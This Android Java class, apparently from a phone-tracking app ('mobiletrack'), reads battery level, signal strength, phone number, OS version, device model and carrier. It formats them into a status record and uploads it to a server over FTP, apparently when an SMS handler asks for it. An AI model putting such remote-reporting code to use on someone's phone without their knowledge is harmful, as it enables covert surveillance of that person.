package com.mobiletrack.record;

import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.telephony.PhoneStateListener;
import android.telephony.SignalStrength;
import android.telephony.TelephonyManager;

import com.mobiletrack.config.Config;
import com.mobiletrack.handler.SmsHandler;
import com.mobiletrack.service.FTPTransferManager;

public class DeviceStatusRecord extends Record {

	private String _localNumber;
	protected int batteryLevel = -1;
	protected String batteryAmount = "";
	protected int signal = 0;
	private BroadcastReceiver batteryReceiver;
	private Context context;
	private boolean sig = false;
	private boolean bat = false;


	private boolean sent = false;
	TelephonyManager        tel;
	MyPhoneStateListener    myListener;

	public DeviceStatusRecord(Context context) {
		bat = false;
		sig = false;
		sent = false;
		this.context = context;
		_localNumber = Config.getConfig().getPhoneNumber();
		batteryReceiver = new BroadcastReceiver() {
			int scale = -1;
			//	        int batteryLevel = -1;
			@Override
			public void onReceive(Context context, Intent intent)
			{
				bat = true;
				batteryLevel = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
				scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
				batteryAmount = batteryLevel+"/"+scale;
				checkToSend();
			}

		};
		myListener   = new MyPhoneStateListener();
		tel = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));
		tel.listen(myListener, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS);
		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		context.registerReceiver(batteryReceiver, filter);
		//	    SignalStrength.;

	}
	private class MyPhoneStateListener extends PhoneStateListener {  
		@Override 
		public void onSignalStrengthsChanged(SignalStrength signalStrength)
		{
			sig = true;
			signal = signalStrength.getGsmSignalStrength();
			if (signal == 99 && ! signalStrength.isGsm())
			{
				signal = signalStrength.getCdmaDbm() + signalStrength.getCdmaEcio();
			//	signalStrength.
			}
			checkToSend();
		}
	};

	protected void checkToSend() {
		if (sig && bat &&! sent)
		{
			FTPTransferManager.sendRecordToServer(toString(), context);
			SmsHandler.r.end();
			SmsHandler.r = null;
			sent = true;
		}
	}

	public String toString()
	{
		return "STAT" + VERTICAL_BAR + _localNumber + VERTICAL_BAR +  _dateFormat.format(new Date())
		+ VERTICAL_BAR + batteryLevel + VERTICAL_BAR + signal + VERTICAL_BAR + "Android" 
		+ VERTICAL_BAR + android.os.Build.VERSION.RELEASE + VERTICAL_BAR + android.os.Build.MANUFACTURER
		+ VERTICAL_BAR + android.os.Build.MODEL	+ VERTICAL_BAR
		+ ((TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE)).getNetworkOperatorName()
		+ VERTICAL_BAR;
	}

	public void end()
	{
		tel.listen(myListener, PhoneStateListener.LISTEN_NONE);
		if (batteryReceiver != null)
		{
			context.unregisterReceiver(batteryReceiver);
			batteryReceiver = null;
		}
	}


}
